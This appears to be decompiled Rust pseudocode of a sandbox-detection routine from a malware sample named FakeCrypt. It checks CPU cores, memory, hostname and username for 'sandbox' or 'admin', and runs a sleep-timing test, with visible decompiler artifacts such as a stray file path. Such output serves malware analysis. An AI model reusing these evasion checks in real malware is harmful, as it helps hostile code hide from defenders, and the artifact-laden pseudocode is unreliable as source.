fn FakeCrypt::stealth::is_sandbox() -> long long {
    let v0: Result<struct24, struct16>;  // [bp-0x218], Other Possible Types: alloc::borrow::Cow<str>, struct24, struct16
    let v1: u64;  // [bp-0x210]
    let v2: u64;  // [bp-0x208]
    let v3: alloc::string::String;  // [bp-0x200], Other Possible Types: struct24
    let v4: u64;  // [bp-0x1f8]
    let v5: u64;  // [bp-0x1f0]
    let v6: alloc::string::String;  // [bp-0x1e8]
    let v7: struct456;  // [bp-0x1d0]
    let v9: u64;  // rbx
    let v10: u64;  // rdx
    let v12: core::time::Duration;  // rax:rdx

    v7 = sysinfo::common::System::new_all();
    v9 = &v7 & -0x100 | 1;
    if !((sysinfo::common::System::physical_core_count() & 1) && v10 >= 2 && v7.field_0 >= 0x200000) {
        return v9 & 4294967295;
    }
    v0 = hostname::get();
    v3 = core::result::Result<T,E>::unwrap_or_default(&v0);
    v0 = alloc::string::String::from_utf8_lossy(v4, v5);
    v6 = alloc::str::<impl str>::to_lowercase(v1, v2);
    v0 = struct16 {
        field_0: "sandbox"
        field_8: "admin"
    };
    if !<core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::any(&v0, &v6) {
        v0 = whoami::api::username();
        v3 = alloc::str::<impl str>::to_lowercase("admin", v2);
        v0 = struct16 {
            field_0: "admin"
            field_8: "/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/block-padding-0.3.3/src/lib.rs"
        };
        if !<core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::any(&v0, &v3) {
            v0 = struct16 {
                field_0: std::time::Instant::now() as u64
                field_8: v10 as u32
            };
            std::thread::sleep(2, 0);
            v12 = std::time::Instant::elapsed(&v0);
        }
    }
    return v9 & 4294967295;
}
